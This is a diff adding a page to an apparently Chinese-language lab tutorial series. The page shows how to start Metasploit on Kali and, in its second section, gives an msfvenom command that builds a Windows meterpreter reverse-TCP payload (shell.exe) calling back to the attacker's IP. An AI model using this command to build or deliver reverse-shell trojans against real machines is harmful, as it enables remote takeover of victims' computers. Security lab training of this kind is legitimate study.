@@ -1,31 +1,52 @@
-<!DOCTYPE html> 
-<html lang="en"> 
-<head> 
-    <meta charset="UTF-8"> 
-    <title>3</title> 
-    <link rel="stylesheet" type="text/css" href="default.css"> 
-</head> 
-<body> 
-<div id="center"> 
-  <div class="background"> 
-    <h3> 
- 
-    </h3> 
-  </div> 
-    <div> 
-        <a href="2.html"><button>previous page,2</button></a> 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
-        <a href="4.html"><button>next page,4</button></a> 
-    </div> 
-</div> 
-</body> 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>被控端生成</title>
+    <link rel="stylesheet" type="text/css" href="default.css">
+</head>
+<body>
+<div id="center">
+    <div class="background">
+        <h3>打开kali虚拟机 启动metasploit,终端输入msfconsole启动</h3>
+        <img src="picture/18.png" alt=""><hr>
+        <h3>每次启动metasploit时界面随机,可以输入banner切换</h3>
+        <img src="picture/19.png" alt="">
+        <img src="picture/20.png" alt="">
+        <img src="picture/21.png" alt="">
+        <img src="picture/22.png" alt="">
+        <hr>
+        <h3>终端中输入clear可清理屏幕</h3>
+        <img src="picture/23.png" alt="">
+        <h3>呐，你看，没有了</h3>
+        <img src="picture/24.png" alt=""><hr>
+        <h3>第二种启动方式是搜索:metasploit framwork</h3>
+        <img src="picture/25.png" alt=""><hr>
+    </div>
+    <div class="background">
+        <h3>生成被控端命令:msfconsole中输入:msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=4444 -f exe >shell.exe</h3>
+        <img src="picture/26.png" alt="">
+        <h3>ps:lhost为攻击端ip地址(kali的ip,不是windows的ip)</h3>
+        <h3>生成的被控端在桌面名为shell.exe</h3>
+    </div>
+    <div>
+        <a href="2.html">
+            <button>previous page,windows7安装至虚拟机</button>
+        </a>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="4.html">
+            <button>next page,使用apache搭建局域网网站</button>
+        </a>
+    </div>
+</div>
+</body>
 </html>
